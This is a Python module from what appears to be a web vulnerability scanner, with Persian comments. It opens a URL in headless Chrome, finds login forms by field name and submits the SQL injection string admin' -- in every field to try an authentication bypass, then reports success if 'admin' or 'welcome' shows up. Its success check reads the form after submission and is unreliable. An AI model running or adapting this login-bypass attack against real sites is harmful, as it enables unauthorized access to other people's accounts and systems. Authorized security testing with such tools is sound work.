# core/selenium_scanner.py

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from payloads import sqli
import time

def scan_with_browser(url):
    print(f"[selenium] باز کردن آدرس در مرورگر: {url}")

    options = Options()
    options.add_argument('--headless')  # بدون UI
    options.add_argument('--disable-gpu')
    driver = webdriver.Chrome(options=options)

    try:
        driver.get(url)
        time.sleep(2)  # صبر برای لود کامل JS

        forms = driver.find_elements(By.TAG_NAME, "form")
        if not forms:
            print("[selenium] فرم HTML پیدا نشد.")
            return

        print(f"[selenium] {len(forms)} فرم پیدا شد.")

        for form in forms:
            inputs = form.find_elements(By.TAG_NAME, "input")
            names = [inp.get_attribute("name") for inp in inputs if inp.get_attribute("name")]
            print(f"  ↳ فرم با فیلدها: {names}")

            if any("user" in name.lower() or "pass" in name.lower() for name in names):
                print("    ⤷ فرم login شناسایی شد. تست SQLi با داده واقعی...")
                data = {name: "admin' --" for name in names}
                sqli_via_selenium(form, inputs, data)
                return

    except Exception as e:
        print(f"[selenium] خطا: {e}")
    finally:
        driver.quit()

def sqli_via_selenium(form, inputs, data):
    for inp in inputs:
        name = inp.get_attribute("name")
        if name in data:
            try:
                inp.clear()
                inp.send_keys(data[name])
            except:
                continue

    try:
        form.submit()
        time.sleep(2)
        if "admin" in form.text.lower() or "welcome" in form.text.lower():
            print("    ✅ SQLi موفق در فرم login از طریق Selenium")
        else:
            print("    ❌ فرم ارسال شد ولی SQLi نشد.")
    except Exception as e:
        print(f"    ⚠️ خطا هنگام submit فرم: {e}")
